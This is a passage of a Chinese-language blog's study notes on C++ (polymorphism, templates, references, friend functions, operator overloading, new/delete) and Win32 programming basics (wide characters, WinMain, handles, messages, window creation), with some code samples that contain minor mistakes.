多态</h2><p>一种类型能够体现出不同的行为，叫做多态</p><p><strong>绑定：</strong></p><ol><li>虚函数继承<strong>重写</strong>会直接替换虚表里的所有之前的虚函数。</li><li>绑定就是将函数调用与地址关联起来</li><li>如果函数编译完就知道地址，就称其为编译期绑定or前期绑定</li><li>如果只有在运行时才知道地址，就称其为动态绑定or运行期绑定</li><li><strong>只有虚函数是动态绑定的</strong>，动态绑定就是多态</li></ol><p><strong>！！！没有多态，你父类指针只能访问自己的方法，不能访问子类的方法。多态是由虚表实现的。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="function"><span class="keyword">public</span></span></span><br><span class="line"><span class="function"><span class="title">Base</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Function_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Base:Function_1...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Function_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Base:Function_2...virtual\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub</span>:</span><span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Sub</span>()</span><br><span class="line">&#123;</span><br><span class="line">x = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Function_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sub:Function_1...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Function_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sub:Function_2...virtual\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TestBound</span><span class="params">(Base* pb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = pb-&gt;x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,n);</span><br><span class="line"></span><br><span class="line">pb-&gt;<span class="built_in">Function_1</span>();<span class="comment">//函数调用</span></span><br><span class="line"></span><br><span class="line">pb-&gt;<span class="built_in">Function_2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Base a;</span><br><span class="line">    <span class="built_in">TestBound</span>(a);</span><br><span class="line">    <span class="comment">//64 Base1 Base2</span></span><br><span class="line">Sub b;</span><br><span class="line">    <span class="built_in">TestBound</span>(b);</span><br><span class="line">    <span class="comment">//64 Base1 Sub2</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="0x08-模板"><a href="#0x08-模板" class="headerlink" title="0x08 模板"></a>0x08 模板</h2><p>模板可以替换任何类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;class T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">(T a)</span></span>;</span><br><span class="line"><span class="comment">//hello函数可以接收任何类型的参数</span></span><br></pre></td></tr></table></figure><p>如果需要接收两个不同的类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;class T,class B&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">(T a,B b)</span></span>;</span><br></pre></td></tr></table></figure><p>类中的模板和函数中的模板不一样</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="built_in">demo</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line">demo&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span>::<span class="built_in">demo</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//需要这么定义</span></span><br><span class="line">&#125;</span><br><span class="line">demo&lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line"><span class="comment">//需要这么调用</span></span><br></pre></td></tr></table></figure><br><h2 id="0x09-引用"><a href="#0x09-引用" class="headerlink" title="0x09 引用"></a>0x09 引用</h2><ul><li>函数传值时引用和指针在底层没有区别，引用是指针的语法糖，可以更安全的访问对象的内容。</li><li>安全是因为引用只能赋值一次，而且必须要初始化。</li><li>引用不占用空间，可以理解成变量的一个别名。（反汇编代码中不会存储引用的值）</li></ul><br><h2 id="0x0A-友元函数"><a href="#0x0A-友元函数" class="headerlink" title="0x0A 友元函数"></a>0x0A 友元函数</h2><p>什么时候需要用到友元函数：</p><ol><li>运算符重载</li><li>让别的函数和类访问自己的private</li></ol><p>友元函数和类的成员函数的区别</p><ol><li>成员函数有this指针，友元函数没有。</li><li>友元函数不可被继承，它只是普通的函数。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在类中声明即可</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">demo</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><br><h2 id="0x0B-运算符重载"><a href="#0x0B-运算符重载" class="headerlink" title="0x0B 运算符重载"></a>0x0B 运算符重载</h2><ul><li>运算符重载就是函数替换</li><li><code>. :: ?: sizeof #</code>不能重载</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型 <span class="keyword">operator</span>重载的符号();</span><br></pre></td></tr></table></figure><p>一种情况中，运算符重载一定要用友元函数：当该运算符的第一个运算数为其他类的时候。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//友元函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ss</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        x=<span class="number">10</span>;</span><br><span class="line">        y=<span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> demo <span class="keyword">operator</span>+(demo&amp; pp,demo&amp; bb);</span><br><span class="line">&#125;;</span><br><span class="line">demo <span class="keyword">operator</span>+(demo&amp; pp,demo&amp; bb)</span><br><span class="line">&#123;</span><br><span class="line">    pp.x=pp.x+bb.x;</span><br><span class="line">    pp.y=pp.y+pp.y;</span><br><span class="line">    <span class="keyword">return</span> pp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//成员函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ss</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        x=<span class="number">10</span>;</span><br><span class="line">        y=<span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    demo <span class="keyword">operator</span>+(demo&amp; pp)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x=pp.x+<span class="keyword">this</span>-&gt;x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y=pp.y+<span class="keyword">this</span>-&gt;y;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><h2 id="0x0c-new-delete"><a href="#0x0c-new-delete" class="headerlink" title="0x0c new delete"></a>0x0c new delete</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* a = <span class="keyword">new</span> <span class="keyword">int</span>;<span class="comment">//分配一个int类型</span></span><br><span class="line"><span class="keyword">int</span>* b = <span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(<span class="number">5</span>);<span class="comment">//分配一个int类型，初始值为5</span></span><br><span class="line"><span class="keyword">int</span>* c = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];<span class="comment">//分配5个int类型（数组）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> a;</span><br><span class="line"><span class="keyword">delete</span> b;</span><br><span class="line"><span class="keyword">delete</span>[] c;</span><br></pre></td></tr></table></figure><br><h1 id="win32"><a href="#win32" class="headerlink" title="win32"></a>win32</h1><h2 id="0x00-宽字符"><a href="#0x00-宽字符" class="headerlink" title="0x00 宽字符"></a>0x00 宽字符</h2><p>UNICODE字符占用两个字节，char只能存储一个字节，所以我们要使用宽字符。然后使用L表示查询UNICODE表而不是ASCII表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> cn = <span class="string">L&#x27;中&#x27;</span>;</span><br><span class="line"><span class="comment">//char数组末尾有一个\0，宽字符数组末尾有两个\0</span></span><br><span class="line"><span class="keyword">wchar_t</span> cn[] = <span class="string">L&quot;中国&quot;</span>;</span><br></pre></td></tr></table></figure><p>打印出中文需要让编译器知道你的国家，否则编译器不知道怎么解释Unicode编码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;%s\n&quot;</span>,cn);</span><br></pre></td></tr></table></figure><p><code>setlocale()</code>函数既可以用来对当前程序进行<strong>地域设置</strong>（本地设置、区域设置），也可以用来获取当前程序的<strong>地域设置信息</strong>。</p><p>打印长度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> x[] = <span class="string">&quot;中国&quot;</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> x2[] = <span class="string">L&quot;中国&quot;</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> x3[] = <span class="string">L&quot;中A国&quot;</span>;</span><br><span class="line"><span class="built_in">strlen</span>(x);<span class="comment">//4</span></span><br><span class="line"><span class="built_in">wcslen</span>(x2);<span class="comment">//2</span></span><br><span class="line"><span class="built_in">wcslen</span>(x3);<span class="comment">//3</span></span><br></pre></td></tr></table></figure><p>TCHAR在ASCII环境下就是CHAR类型，在UNICODE环境下就是WCHAR类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CHAR cha[] = <span class="string">&quot;中国&quot;</span>;</span><br><span class="line">WCHAR chw[] = <span class="string">L&quot;中国&quot;</span>;</span><br><span class="line">TCHAR cht[] = <span class="built_in">TEXT</span>(<span class="string">&quot;中国&quot;</span>);</span><br><span class="line">TCHAR cht2 = <span class="built_in">TEXT</span>(<span class="string">&quot;中&quot;</span>);</span><br></pre></td></tr></table></figure><p>举个例子，MessageBox和TCHAR一样也是个宏</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>,<span class="string">&quot;内容多字节&quot;</span>,<span class="string">&quot;标题&quot;</span>,MB_OK);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBoxW</span>(<span class="number">0</span>,<span class="string">L&quot;内容宽字节&quot;</span>,<span class="string">L&quot;标题&quot;</span>,MB_OK);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>,<span class="built_in">TEXT</span>(<span class="string">&quot;根据项目字符集决定&quot;</span>),<span class="built_in">TEXT</span>(<span class="string">&quot;标题&quot;</span>),MB_OK);</span><br><span class="line"><span class="comment">//Windows提供的API 凡是需要传递字符串参数的函数，都会提供两个版本和一个宏.</span></span><br></pre></td></tr></table></figure><br><h2 id="0x01-win32概述和入口函数"><a href="#0x01-win32概述和入口函数" class="headerlink" title="0x01 win32概述和入口函数"></a>0x01 win32概述和入口函数</h2><p>win32 api主要是存放在C:\WINDOWS\system32下面的dll</p><p>非常重要的DLL：</p><ul><li>Kernel32.dll：最核心的功能模块，比如管理内存、进程和线程相关的函数等.</li><li>User32.dll：是Windows用户界面相关应用程序接口，如创建窗口和发送消息等.</li><li>GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数：比如要显示一个程序窗口，就调用了其中的函数来画这个窗口</li></ul><p>windows的入口函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(<span class="comment">//WINAPI是调用约定__stdcall</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  HINSTANCE hInstance,<span class="comment">//程序的ImageBase</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  HINSTANCE hPrevInstance,<span class="comment">//没有任何意义。它在16位Windows中使用，但现在始终为零。</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  LPSTR lpCmdLine,<span class="comment">//包含命令行参数作为Unicode字符串。就是在程序运行前传个值，和main的参数一样。</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  <span class="keyword">int</span> nCmdShow<span class="comment">//一个标志，指示是否将主应用程序窗口最小化，最大化或正常显示。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="0x02-对句柄的理解"><a href="#0x02-对句柄的理解" class="headerlink" title="0x02 对句柄的理解"></a>0x02 对句柄的理解</h2><p>句柄是进程中相应对象的索引而已，有点像数组的下标，比如事件句柄<code>hModule ev = CreateEvent(NULL, NULL, NULL, NULL);</code>其实是创建了一个内核对象<code>KEVENT</code>和一个能索引到这个对象的句柄<code>ev</code>。之所以用句柄而不是指针，是因为用指针的话用户就可以直接直接操作内核对象了，比较危险，而句柄只是个索引（下标），通过API函数把这个索引传进去让系统API函数来操作就会安全些。</p><p><code>hModule</code>和<code>hInstance</code>在32位下是一样句柄，他们指向程序在内存中的地址（ImageBase）；</p><p><code>hwnd</code>则是窗口的句柄。</p><br><h2 id="0x03-消息与事件"><a href="#0x03-消息与事件" class="headerlink" title="0x03 消息与事件"></a>0x03 消息与事件</h2><p>windows中的事件就是一个动作，比如你点击了鼠标，滑动了鼠标都是事件。</p><p>消息就是用来描述动作的。</p><p>windows为了能准确的描述这些信息，提供了一个结构体：MSG。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> &#123;</span></span><br><span class="line">HWND   hwnd;<span class="comment">//用于标识窗口，窗口的句柄</span></span><br><span class="line">UINT   message;<span class="comment">//消息类型。</span></span><br><span class="line">WPARAM wParam;<span class="comment">//对消息类型进一步的说明</span></span><br><span class="line">LPARAM lParam;<span class="comment">//对消息类型进一步的说明</span></span><br><span class="line">DWORD  time;<span class="comment">//消息创建时的时间</span></span><br><span class="line">POINT  pt;<span class="comment">//坐标，你鼠标的位置</span></span><br><span class="line">&#125; MSG, *PMSG;</span><br></pre></td></tr></table></figure><br><h2 id="0x04-创建窗口"><a href="#0x04-创建窗口" class="headerlink" title="0x04 创建窗口"></a>0x04 创建窗口</h2><p>创建窗口的过程：</p><p><img src="https://i.loli.net/2021/01/13/lASifrd8Ue2yGMj.png" alt="image-20210113150148794"></p><p>创建窗口的步骤：</p><ol><li>设计窗口类</li><li>注册上面设计的窗口</li><li>创建窗口</li><li>显示窗口</li><li>消息循环</li><li>回调函数</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//窗口的类名</span></span><br><span class="line">TCHAR className[] = <span class="string">&quot;My First Window&quot;</span>;</span><br><span class="line"><span class="comment">// 创建窗口类的对象</span></span><br><span class="line">WNDCLASS wndclass = &#123;<span class="number">0</span>&#125;;<span class="comment">//一定要先将所有值赋值</span></span><br><span class="line">wndclass.hbrBackground = (HBRUSH)COLOR_MENU+<span class="number">1</span>;<span class="comment">//窗口的背景色，使用颜色的时候，必须把每个颜色宏+1，才能得到正确的颜色，这是用法，没有特别的含义。</span></span><br><span class="line">wndclass.lpfnWndProc = WindowProc;<span class="comment">//窗口过程函数</span></span><br><span class="line">wndclass.lpszClassName = className;<span class="comment">//窗口类的名字</span></span><br><span class="line">wndclass.hInstance = hInstance;<span class="comment">//定义窗口类的应用程序的实例句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注册窗口类</span></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd = <span class="built_in">CreateWindow</span>(</span><br><span class="line">className,<span class="comment">//类名</span></span><br><span class="line"><span class="built_in">TEXT</span>(<span class="string">&quot;我的第一个窗口&quot;</span>),<span class="comment">//窗口标题</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//窗口外观样式</span></span><br><span class="line"><span class="number">10</span>,<span class="comment">//相对于父窗口的X坐标</span></span><br><span class="line"><span class="number">10</span>,<span class="comment">//相对于父窗口的Y坐标</span></span><br><span class="line"><span class="number">600</span>,<span class="comment">//窗口的宽度</span></span><br><span class="line"><span class="number">300</span>,<span class="comment">//窗口的高度</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//父窗口句柄，为NULL</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单句柄，为NULL。在子窗口时是个用于区分的编号</span></span><br><span class="line">hInstance,<span class="comment">//当前应用程序的句柄</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">//附加数据一般为NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hwnd == <span class="literal">NULL</span>)<span class="comment">//是否创建成功</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN  HWND hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">IN  UINT uMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">IN  WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">IN  LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//窗口消息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd,uMsg,wParam,lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WNDCLASS结构：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagWNDCLASSA</span> &#123;</span></span><br><span class="line">UINT      style;<span class="comment">//</span></span><br><span class="line">WNDPROC   lpfnWndProc;<span class="comment">//窗口的消息处理函数</span></span><br><span class="line"><span class="keyword">int</span>       cbClsExtra;<span class="comment">//</span></span><br><span class="line"><span class="keyword">int</span>       cbWndExtra;<span class="comment">//</span></span><br><span class="line">HINSTANCE hInstance;<span class="comment">//当前窗口属于哪一个应用程序</span></span><br><span class="line">HICON     hIcon;<span class="comment">//窗口的标识</span></span><br><span class="line">HCURSOR   hCursor;<span class="comment">//窗口中鼠标的形状</span></span><br><span class="line">HBRUSH    hbrBackground;<span class="comment">//窗口的背景色</span></span><br><span class="line">LPCSTR    lpszMenuName;<span class="comment">//窗口菜单的名字</span></span><br><span class="line">LPCSTR    lpszClassName;<span class="comment">//窗口类的名字</span></span><br><span class="line">&#125; WNDCLASSA, *PWNDCLASSA, *NPWNDCLASSA, *LPWNDCLASSA;</span><br></pre></td></tr></table></figure><p>消息处理函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HWND   hwnd,<span class="comment">//用于标识窗口，窗口的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT   uMsg,<span class="comment">//消息类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ WPARAM wParam,<span class="comment">//对消息类型进一步的说明</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPARAM lParam<span class="comment">//对消息类型进一步的说明</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><br><h2 id="0x0？一些要用过的函数"><a href="#0x0？一些要用过的函数" class="headerlink" title="0x0？一些要用过的函数"></a>0x0？一些要用过的函数</h2><p><code>GetLastError</code>跟在出错的函数后面，可以返回错误码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD errorcode = <span class="built_in">GetLastError</span>();</span><br></pre></td></tr></table></figure><p><code>GetModuleHandle</code>返回<code>ImageBase</code></p>]]></content>
      
      
      <categories>
          
          <category> 2020年12月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] PE解析</title>
      <link href="/2020/12/06/PE%E8%A7%A3%E6%9E%90/"/>
      <url>/2020/12/06/PE%E8%A7%A3%E6%9E%90/</url>
      
